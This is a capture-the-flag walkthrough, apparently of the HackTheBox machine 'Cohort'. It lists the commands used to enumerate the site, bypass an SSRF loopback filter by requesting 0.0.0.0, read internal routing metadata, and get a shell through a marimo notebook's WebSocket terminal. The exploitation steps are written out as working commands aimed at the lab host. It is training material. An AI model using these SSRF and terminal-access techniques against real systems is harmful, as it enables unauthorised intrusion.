# Cohort - HackTheBox - Easy

> **Date:** 2026-11-07  
> **Platform:** HackTheBox  
> **Difficulty:** Easy  
> **Scope:** User flag only  
> **Tags:** `#linux` `#web` `#ssrf` `#marimo` `#websocket`

## Summary

Directory enumeration led to a URL validation API with an SSRF filtering gap. Requests through `0.0.0.0` exposed internal routing metadata and a marimo notebook service. Connecting to the notebook terminal over WebSockets provided a shell as `marimo@cohort`, allowing the user flag to be retrieved.

This walkthrough is based on the supplied commands and results. Root access was not demonstrated.

## 1. Enumerate website directories

```bash
gobuster dir -u https://cohort.htb -k \
  -w /usr/share/wordlists/dirb/common.txt
```

Unknown paths returned HTTP 200 with 908-byte responses, consistent with an SPA serving a fallback page. Repeat the scan with a length filter to suppress wildcard responses:

```bash
gobuster dir -u https://cohort.htb/ -k \
  -w /usr/share/wordlists/dirb/common.txt --exclude-length 908
```

- `-u` sets the target; `-w` supplies candidates; `-k` skips certificate verification.
- `--exclude-length 908` hides responses with a body length of 908 bytes.

```text
/api       (Status: 301) [Size: 178] -> https://cohort.htb/api/
/assets    (Status: 301) [Size: 178] -> https://cohort.htb/assets/
/status    (Status: 403) [Size: 162]
```

`/api` and `/assets` redirected to their trailing-slash URLs. Direct access to `/status` was forbidden, but the endpoint remained worth investigating.

## 2. Enumerate API paths

```bash
gobuster dir -u https://cohort.htb/api -k \
  -w /usr/share/wordlists/dirb/common.txt --exclude-length 47
```

This scan discovers paths beneath `/api` using the same wordlist, excluding response bodies of 47 bytes.

```text
/health    (Status: 200) [Size: 42]
```

`/api/health` returned successfully with a 42-byte response body:

```bash
curl -k https://cohort.htb/api/health
```

```json
{"ok": true, "service": "cohort-insights"}
```

The health check identified the service as `cohort-insights`. `/api/validate` was subsequently tested with POST requests. It was absent from the Gobuster results; its discovery method remains undocumented.

## 3. Test the URL validation endpoint

```bash
curl -ks 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'
```

The endpoint returned:

```text
Internal or loopback addresses are not permitted.
```

`POST /api/validate` accepted a `url` field but rejected the loopback address.

## 4. Identify an SSRF filtering gap

```bash
curl -ks 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0/"}'
```

The response contained `ok=true`, `fetched_status=200`, and the Cohort Analytics homepage. The backend fetched the supplied URL and returned an HTML preview.

Although `127.0.0.1` was rejected, `0.0.0.0` reached local services. This demonstrated an SSRF filtering gap in the URL validator.

## 5. Discover internal service routing

```bash
curl -ks 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0/status"}'
```

The request returned HTTP 200 with JSON identifying `cohort-edge` and nginx. The exposed routing metadata revealed:

| Item | Value |
|------|-------|
| Marketing root | `/var/www/cohort` |
| Insights API | `127.0.0.1:5000`, routed under `/api/` |
| Notebook target | `127.0.0.1:8888` |
| Notebook hostname | `nb-1be3782a8afd3ad5.cohort.htb` |

The metadata identified an internal analyst workspace. Unlike the direct HTTP 403 response, the SSRF request retrieved `/status` successfully.

## 6. Identify the notebook application

```bash
curl -ks 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0:8888/"}'
```

The response was HTTP 200 with a marimo login page. The form requested an access token or password at `/auth/login`.

The internal notebook service was reachable through SSRF. HTTP 200 confirmed page access; authentication was not demonstrated. No token or password appeared in the supplied responses.

## 7. Open the terminal WebSocket

```bash
websocat -k \
  'wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws'
```

The connection provided a shell as `marimo@cohort`.

- `wss://` establishes a WebSocket connection over TLS.
- `-k` disables TLS certificate verification.
- The terminal endpoint provided an interactive shell connection over WebSockets; this was not a reverse shell.

The exact authentication flaw was not established by these results.

## 8. Verify access and retrieve the user flag

```bash
whoami
pwd
ls
cat user.txt
```

- `whoami` confirmed the shell user was `marimo`.
- `pwd` displayed the current working directory.
- `ls` listed directory contents, including `user.txt`.
- `cat user.txt` printed the user flag.

User access was achieved and the user flag retrieved. The exact directory and flag value were not supplied.

## Findings

- The URL validator allowed local service access through `0.0.0.0`.
- `/status` exposed internal service targets and the notebook hostname.
- The notebook terminal connection provided shell access as `marimo`.
- This walkthrough ends at the user flag; root access was not demonstrated.
